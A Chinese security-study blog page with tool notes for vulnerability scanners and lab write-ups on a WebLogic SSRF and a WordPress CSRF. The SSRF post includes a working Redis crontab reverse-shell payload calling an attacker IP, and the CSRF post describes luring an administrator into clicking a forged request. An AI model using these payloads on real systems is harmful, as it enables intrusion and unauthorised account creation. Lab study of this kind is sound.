<h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><h4 id="一、基础爬虫模式"><a href="#一、基础爬虫模式" class="headerlink" title="一、基础爬虫模式"></a>一、基础爬虫模式</h4><h6 id="1、爬虫获取链接后进行漏扫"><a href="#1、爬虫获取链接后进行漏扫" class="headerlink" title="1、爬虫获取链接后进行漏扫"></a>1、爬虫获取链接后进行漏扫</h6><p>.&#x2F;xray webscan –basic-crawler url -html-output a.html</p>
<h4 id="二、使用代理模式扫描「常用」"><a href="#二、使用代理模式扫描「常用」" class="headerlink" title="二、使用代理模式扫描「常用」"></a>二、使用代理模式扫描「常用」</h4><h6 id="1、安装浏览器插件switchOmega"><a href="#1、安装浏览器插件switchOmega" class="headerlink" title="1、安装浏览器插件switchOmega"></a>1、安装浏览器插件switchOmega</h6><h6 id="2、启动xray，使用命令生成证书：xray-exe-genca"><a href="#2、启动xray，使用命令生成证书：xray-exe-genca" class="headerlink" title="2、启动xray，使用命令生成证书：xray.exe genca"></a>2、启动xray，使用命令生成证书：xray.exe genca</h6><h6 id="3、安装并信任生成的证书"><a href="#3、安装并信任生成的证书" class="headerlink" title="3、安装并信任生成的证书"></a>3、安装并信任生成的证书</h6><h6 id="4、启动xray代理：第一次启动，当前目录会生成config-yml"><a href="#4、启动xray代理：第一次启动，当前目录会生成config-yml" class="headerlink" title="4、启动xray代理：第一次启动，当前目录会生成config.yml"></a>4、启动xray代理：第一次启动，当前目录会生成config.yml</h6><p>mitm中restriction中hostname_allowed增加testphp.vulnweb.com<br>.&#x2F;xray webscan –listen 127.0.0.1:7777 –html-output pro.html<br>网页代理选择http 127.0.0.1:7777</p>
<h2 id="nuclei"><a href="#nuclei" class="headerlink" title="nuclei"></a>nuclei</h2><p>安装目录在&#x2F;usr&#x2F;local&#x2F;bin下</p>
<p>github安装使用&#x2F;docker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/projectdiscovery/nuclei-templates</span><br><span class="line">tar -xzvf nuclei-linux-amd64.tar</span><br><span class="line">mv nuclei-linux-amd64 /usr/bin/nuclei</span><br><span class="line">nuclei -h</span><br></pre></td></tr></table></figure>

<h6 id="单个目标扫描"><a href="#单个目标扫描" class="headerlink" title="单个目标扫描"></a>单个目标扫描</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nuclei -u http://192.168.204.179</span><br></pre></td></tr></table></figure>

<h6 id="多个目标扫描"><a href="#多个目标扫描" class="headerlink" title="多个目标扫描"></a>多个目标扫描</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nuclei -list http_urls.txt</span><br></pre></td></tr></table></figure>

<h6 id="自定义模板目录或多个模板目录"><a href="#自定义模板目录或多个模板目录" class="headerlink" title="自定义模板目录或多个模板目录"></a>自定义模板目录或多个模板目录</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nuclei -u http://192.168.204.179/dvwa/login.php -t default-logins/</span><br></pre></td></tr></table></figure>

<h6 id="支持过滤器"><a href="#支持过滤器" class="headerlink" title="支持过滤器"></a>支持过滤器</h6><p>只想扫描高危漏洞：-serverity critical,high</p>
<h2 id="scan4all"><a href="#scan4all" class="headerlink" title="scan4all"></a>scan4all</h2><p>集成vscan、nuclei、ksubdomain、subfinder等，全自动化、智能化的渗透测试工具</p>
<p>安装库：sudo apt install -y libpcap-dev golang git</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scan4all -host 192.168.204.179</span><br></pre></td></tr></table></figure>

<h2 id="afrog"><a href="#afrog" class="headerlink" title="afrog"></a>afrog</h2><p>PoC支持CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意文件读取、命令执行等多种漏洞类型</p>
<h6 id="扫描单个目标"><a href="#扫描单个目标" class="headerlink" title="扫描单个目标"></a>扫描单个目标</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afrog -t http://192.168.204.179</span><br></pre></td></tr></table></figure>

<h6 id="扫描多个目标"><a href="#扫描多个目标" class="headerlink" title="扫描多个目标"></a>扫描多个目标</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afrog -T url.txt -o url.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#按PoC关键字扫描</span><br><span class="line">-s tomcat,springboot,shiro</span><br><span class="line">#按PoC漏洞等级扫描</span><br><span class="line">-S high,critical</span><br></pre></td></tr></table></figure>

<h2 id="特定类型漏扫工具"><a href="#特定类型漏扫工具" class="headerlink" title="特定类型漏扫工具"></a>特定类型漏扫工具</h2><h3 id="BBScan"><a href="#BBScan" class="headerlink" title="BBScan"></a>BBScan</h3><p>高并发、轻量级「目标多，想迅速定位」</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lijiejie/BBScan</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python BBScan.py -f urls.txt</span><br><span class="line">python BBScan.py --host www.target.com --network 28</span><br></pre></td></tr></table></figure>

<h3 id="Thinkphp漏扫工具"><a href="#Thinkphp漏扫工具" class="headerlink" title="Thinkphp漏扫工具"></a>Thinkphp漏扫工具</h3><h3 id="Weblogic漏扫工具"><a href="#Weblogic漏扫工具" class="headerlink" title="Weblogic漏扫工具"></a>Weblogic漏扫工具</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="jojo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ChillyBerry's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">weblogic-SSRF漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-27 19:26:02" itemprop="dateCreated datePublished" datetime="2022-07-27T19:26:02+08:00">2022-07-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-07-28 11:13:45" itemprop="dateModified" datetime="2022-07-28T11:13:45+08:00">2022-07-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <span id="more"></span>

<p>环境在&#x2F;vulhub&#x2F;weblogic&#x2F;ssrf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动docker镜像：docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>一、访问url:7001&#x2F;uddiexplorer，点击search public registries</p>
<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727200208141.png" alt="image-20220727200208141"></p>
<p>二、填完信息后bp抓该页面的包</p>
<img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727200413263.png" alt="image-20220727200413263">

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1</span><br><span class="line">Host: 192.168.31.83:7001</span><br><span class="line">Content-Length: 175</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.31.83:7001</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.31.83:7001/uddiexplorer/SearchPublicRegistries.jsp</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=Qvy3vhpdqpTqJNndL99TV0vw6G37QTWDSdjpPqTPYScHnNcvjqgr!2026307918</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">operator=http%3A%2F%2Fwww-3.ibm.com%2Fservices%2Fuddi%2Finquiryapi&amp;rdoSearch=name&amp;txtSearchname=111&amp;txtSearchkey=222&amp;txtSearchfor=333&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>

<p><strong>请求参数operator</strong>为一个url，此处可替换url，将url修改为自己搭建的服务器地址「本机docker的ip需要另外命令」，访问开放的7001端口，会返回一个状态码404，同网页访问一样。访问一个不存在的端口会返回连不上服务器。根据报错的不同，可以进行内网探测。通过ssrf探测内网中的redis服务器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看docker容器weblogic的ip</span><br><span class="line">第一种方法：</span><br><span class="line">进入docker：docker exec -it id /bin/bash</span><br><span class="line">ifconfig</span><br><span class="line">第二种方法：</span><br><span class="line">docker inspect 3d8272ebde6e</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis服务器ip：192.168.80.2</span><br><span class="line">weblogic服务器ip：192.168.80.3</span><br></pre></td></tr></table></figure>

<p>把operator里的url改成想要探测的主机和端口<br>利用SSRF漏洞访问7001端口的weblogic服务，如果端口开启，会返回不一样的值：<strong>同网页端访问一样</strong></p>
<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727211400220.png" alt="image-20220727211400220"></p>
<p>利用SSRF漏洞访问6379端口的redis服务，如果端口开启，会返回不一样的值：<strong>have a valid SOAP content-type:null</strong></p>
<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220727211738562.png" alt="image-20220727211738562"></p>
<h4 id="redis反弹shell"><a href="#redis反弹shell" class="headerlink" title="redis反弹shell"></a>redis反弹shell</h4><p>kali攻击机：192.168.100.136 监听端口：9001</p>
<h5 id="攻击机kali开启监听"><a href="#攻击机kali开启监听" class="headerlink" title="攻击机kali开启监听"></a>攻击机kali开启监听</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nv -lvvp 9001</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line">set 1 &quot; \n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.100.136/9001 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line"></span><br><span class="line">config set dir /etc/</span><br><span class="line"></span><br><span class="line">config set dbfilename crontab</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url编码后：</span><br><span class="line">test%0A%0Aset%201%20%22%20%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.136%2F9001%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0A%0Aconfig%20set%20dir%20%2Fetc%2F%0A%0Aconfig%20set%20dbfilename%20crontab%0A%0Asave%0A%0Aaaa</span><br></pre></td></tr></table></figure>

<p>将payload通过post方式用bp写入：<br>按理说攻击机的&#x2F;etc&#x2F;crontab内应该存在计划命令</p>
<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220728093308227.png" alt="image-20220728093308227"></p>
<h5 id="bp发包"><a href="#bp发包" class="headerlink" title="bp发包"></a>bp发包</h5><p>攻击机等待1min，成功弹回shell</p>
<p><img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220728093216497.png" alt="image-20220728093216497"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#bug</span></span><br><span class="line">不知道为啥，计划任务里没有命令！但是shell能成功反弹！！！无解「被卡住半天」</span><br></pre></td></tr></table></figure>

<p>解答：该计划任务是写在docker的redis服务器上的</p>
<img src="/2022/07/27/weblogic-SSRF%E6%BC%8F%E6%B4%9E/image-20220728094933099.png" alt="image-20220728094933099" style="zoom:50%;">

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="jojo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ChillyBerry's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="post-title-link" itemprop="url">搭建redis-redis未授权访问</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-27 12:52:02" itemprop="dateCreated datePublished" datetime="2022-07-27T12:52:02+08:00">2022-07-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-08-06 12:14:40" itemprop="dateModified" datetime="2022-08-06T12:14:40+08:00">2022-08-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">环境搭建</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="redis搭建「linux」"><a href="#redis搭建「linux」" class="headerlink" title="redis搭建「linux」"></a>redis搭建「linux」</h4>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="jojo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ChillyBerry's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">wordpress4.7.4-CSRF漏洞利用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-26 19:28:55" itemprop="dateCreated datePublished" datetime="2022-07-26T19:28:55+08:00">2022-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-07-28 09:57:34" itemprop="dateModified" datetime="2022-07-28T09:57:34+08:00">2022-07-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h5 id="wp搭站注意事项："><a href="#wp搭站注意事项：" class="headerlink" title="wp搭站注意事项："></a>wp搭站注意事项：</h5><p>访问&#x2F;wp-admin&#x2F;setup-config.php<br>用小皮先另外创建一个数据库 配置要和wp-config-sample.php里的一样<br>ps:让wordpress在使用时可以使用本机ip而不是跳转到locolhost 可以在网页后台-设置中修改wordpress的url</p>
<h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><p>一般配合其他漏洞一起使用</p>
<p>登入后台添加用户 并用bp抓到该包</p>
<p><img src="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220726204043588.png" alt="image-20220726204043588"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-admin/user-new.php HTTP/1.1</span><br><span class="line">Host: 192.168.2.152</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.2.152</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.2.152/wp-admin/user-new.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wordpress_2955eff27f5512f077181f8a53586cff=admin%7C1659008999%7CYtqStGYf7tqI9iH9Nxz87TB3I7sSHZEA0BImQuSUCsV%7Cbafcabf0c7516a0d7584294b213bebac18be2f9a52986aa523296d7015a0f785; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_2955eff27f5512f077181f8a53586cff=admin%7C1659008999%7CYtqStGYf7tqI9iH9Nxz87TB3I7sSHZEA0BImQuSUCsV%7Cbca2f323399dc9bd026c666b701cc77df6199d55d86893f1950eca6f3485ea92; wp-settings-time-1=1658836304</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">action=createuser&amp;_wpnonce_create-user=79f9ee6f11&amp;_wp_http_referer=%2Fwp-admin%2Fuser-new.php&amp;user_login=1&amp;email=1%401.com&amp;first_name=&amp;last_name=&amp;url=&amp;pass1=123123&amp;pass1-text=123123&amp;pass2=123123&amp;pw_weak=on&amp;send_user_notification=1&amp;role=subscriber&amp;createuser=%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7</span><br></pre></td></tr></table></figure>

<p>对request右键Engagement tools-Generate CSRF PoC 生成csrf利用的一个html文档</p>
<p><img src="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220726195423580.png" alt="image-20220726195423580"></p>
<p>修改一下注册的用户名和邮箱，避免重复<br><img src="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220726195632659.png" alt="image-20220726195632659"></p>
<p>改完之后点击regenerate重新生成。本地测试点击test in browser，实战时诱导管理员点击按钮「发恶意链接给对方」，便可成功利用csrf漏洞创建新用户</p>
<p><img src="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220726201201402.png" alt="image-20220726201201402"></p>
<p><img src="/2022/07/26/wordpress4.7.4-CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220726201123150.png" alt="image-20220726201123150"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="jojo"
      src="/images/1.jpg">
  <p class="site-author-name" itemprop="name">jojo</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">12</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">jojo</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/qwe/anime.min.js"></script>
  <script src="/qwe/velocity/velocity.min.js"></script>
  <script src="/qwe/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
